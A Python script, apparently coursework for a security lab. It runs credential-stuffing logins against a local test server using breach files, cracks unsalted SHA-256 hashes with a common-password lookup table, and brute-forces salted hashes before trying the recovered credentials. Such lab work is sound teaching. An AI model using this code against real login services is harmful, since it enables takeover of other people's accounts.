from csv import reader
from requests import post, codes
import hashlib
from brute import brute_force_attack

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"
#COMMON_PASSWORDS_PATH = 'common_passwords.txt'
SALTED_BREACH_PATH = "app/scripts/breaches/salted_breach.csv"

def build_hash_lookup_table(password_file_path):
    lookup_table = {}
    with open(password_file_path, 'r') as file:
        for password in file:
            password = password.strip()
            hashed = hashlib.sha256(password.encode()).hexdigest()
            lookup_table[hashed] = password
    return lookup_table

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    # TODO: return a list of credential pairs (tuples) that can successfully login
    #pass
    successful_logins = []
    for username, password in creds:
        if attempt_login(username, password.strip()):
            successful_logins.append((username, password))
            #if len(successful_logins) == 3:
            #    break

    return successful_logins

def main():
    #task 1.1
    #creds = load_breach(PLAINTEXT_BREACH_PATH)
    #print(credential_stuffing_attack(creds))
    
    #common_passwords_path = "common_passwords.txt"
    #hash_lookup = build_hash_lookup_table(common_passwords_path)
    #task1.3
    #load hashed breach
    #hashed_creds = load_breach(HASHED_BREACH_PATH)

    #cracked_creds = []
    #for username, hashed_password in hashed_creds:
    #    if hashed_password in hash_lookup:
    #        cracked_creds.append((username, hash_lookup[hashed_password]))

    #print(cracked_creds)
    #successful_logins = credential_stuffing_attack(cracked_creds)
    #print("Successful logins with cracked passwords:", successful_logins)

    #task 1.4
    salted_creds = load_breach(SALTED_BREACH_PATH)
    print(len(salted_creds))
    print(salted_creds[0])
    print(salted_creds[0][1])
    found_passwords = []

    for username, salted_hash, salt in salted_creds:
        password = brute_force_attack(salted_hash, salt)
        print(password)
        if password:
            found_passwords.append((username, password))

    successful_logins = credential_stuffing_attack(found_passwords)
    print(f"found Passwords: {found_passwords}")
    print(f"Successful logins: {successful_logins}")

if __name__ == "__main__":
    main()
